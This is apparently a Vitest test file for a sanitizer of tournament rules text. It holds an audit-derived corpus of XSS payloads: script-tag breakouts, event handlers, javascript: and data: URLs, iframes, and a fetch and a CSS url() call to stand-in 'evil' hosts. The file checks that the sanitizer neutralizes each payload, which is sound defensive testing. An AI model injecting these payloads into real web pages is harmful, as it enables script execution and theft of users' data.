import { describe, it, expect } from "vitest";
import { sanitizeRichText, looksLikeHtml } from "./rich-text";

// Audit SEC-002 XSS corpus — the shared pipeline now guards tournament
// rules_text and description on the anonymous /e/[code] surfaces too.
describe("sanitizeRichText — XSS corpus", () => {
  const attacks: [string, string][] = [
    ["script tag", '<p>hi</p><script>alert(1)</script>'],
    ["closing-script breakout", 'rules</script><script>fetch("//evil")</script>'],
    ["event handler", '<b onmouseover="alert(1)">bold</b>'],
    ["img onerror", '<img src=x onerror=alert(1)>'],
    ["javascript: URL", '<a href="javascript:alert(1)">click</a>'],
    ["data: URL", '<a href="data:text/html,<script>alert(1)</script>">x</a>'],
    ["svg onload", '<svg onload=alert(1)>'],
    ["iframe", '<iframe src="https://evil.example"></iframe>'],
    ["style exfil", '<span style="background:url(https://evil.example/p)">x</span>'],
    ["encoded handler", '<a href="jAvaScRipt:alert(1)">x</a>'],
  ];
  for (const [name, payload] of attacks) {
    it(`neutralizes: ${name}`, () => {
      const out = sanitizeRichText(payload);
      expect(out).not.toMatch(/<script/i);
      expect(out).not.toMatch(/onerror|onload|onmouseover/i);
      expect(out).not.toMatch(/javascript:/i);
      expect(out).not.toMatch(/<iframe|<svg/i);
      expect(out).not.toMatch(/url\(/i);
    });
  }
  it("keeps the organizer formatting allowlist", () => {
    const out = sanitizeRichText('<p><strong>Rules</strong></p><ul><li>Best of <em>3</em></li></ul><a href="https://klimr.com/legal">terms</a>');
    expect(out).toContain("<strong>Rules</strong>");
    expect(out).toContain("<li>");
    expect(out).toContain('rel="noopener noreferrer nofollow"');
    expect(out).toContain('target="_blank"');
  });
  it("looksLikeHtml separates rich rows from legacy plain text", () => {
    expect(looksLikeHtml("<p>rich</p>")).toBe(true);
    expect(looksLikeHtml("plain old rules\nline two")).toBe(false);
  });
});
